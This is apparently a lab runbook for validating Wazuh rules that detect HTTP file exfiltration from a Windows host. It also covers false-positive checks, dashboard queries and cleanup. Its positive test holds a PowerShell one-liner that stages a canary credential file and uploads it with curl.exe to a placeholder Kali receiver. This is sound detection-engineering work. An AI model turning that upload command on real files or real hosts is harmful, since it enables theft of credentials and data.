# HTTP/HTTPS file exfiltration validation

## Rule file

`rules/http_exfiltration_detection.xml`

## Prerequisites

- WIN01 agent `004` active and collecting Security 4688, Sysmon Event 1, and PowerShell Operational 4104.
- Wazuh manager services healthy.
- Local medium-integrity `SIMULATION\yassine.karimi` PowerShell session.
- A bounded HTTP receiver on the Kali host-only interface. The receiver must impose a small request-size limit, accept only `POST /upload`, write one file, print its SHA-256, and return HTTP 201.
- Use controlled canary credentials only. Do not transmit real credentials.

## Positive test

Create a controlled confidential-looking credential file and upload it as a local file with Windows `curl.exe`:

```powershell
$d="$env:USERPROFILE\Documents\Finance";$p="$d\Q3_Acquisition_DB_Credentials.txt";New-Item -ItemType Directory -Path $d -Force|Out-Null;[IO.File]::WriteAllLines($p,@("Classification=CONFIDENTIAL","System=Q3 Acquisition Finance Database","Account=SIMULATION\svc_backup_ops","Password=<CONTROLLED_CANARY_PASSWORD>","RecoveryToken=<CONTROLLED_CANARY_TOKEN>"));curl.exe -sS -X POST -H "Content-Type: application/octet-stream" --data-binary "@$p" "http://<KALI_HOST_ONLY>:18083/upload"
```

Require all of the following:

```text
Receiver returns HTTP 201 / RECEIVED
Received byte count matches the source
Received SHA-256 matches the source
Rule 100531 level 12 fires for the curl.exe file upload
Rule 100532 level 12 fires for the credential-staging PowerShell script block
Execution identity is SIMULATION\yassine.karimi at medium integrity
```

Rule `100530` is the direct curl file-upload parent. Rule `100531` is its higher-confidence user-profile document/archive child; a live `100531` alert therefore proves the `100530` parent path matched.

## False-positive tests

Run from the same interactive user shell:

```powershell
curl.exe --version *> $null;curl.exe -sS "http://127.0.0.1:9/health" *> $null;curl.exe -sS -X POST --data-binary "status=ok" "http://127.0.0.1:9/telemetry" *> $null;'HTTP_EXFIL_FP_TESTS_DONE'
```

Expected:

```text
Security 4688 receives all three curl.exe executions
No 100530, 100531, or 100532 alert for version output
No custom alert for retrieval-only HTTP traffic
No custom alert for an inline-data POST that does not upload a local file
```

## Dashboard queries

```text
agent.id:"004" AND rule.id:("100531" OR "100532")
```

Per rule:

```text
agent.id:"004" AND rule.id:"100531"
agent.id:"004" AND rule.id:"100532"
```

## Cleanup

Stop the bounded receiver and temporary SSH forwards. Retain the receiver script and controlled received artifact on Kali for reproduction unless cleanup is requested. Delete the controlled credential file from WIN01 when the fixture is no longer needed:

```powershell
Remove-Item "$env:USERPROFILE\Documents\Finance\Q3_Acquisition_DB_Credentials.txt" -Force -ErrorAction SilentlyContinue
```
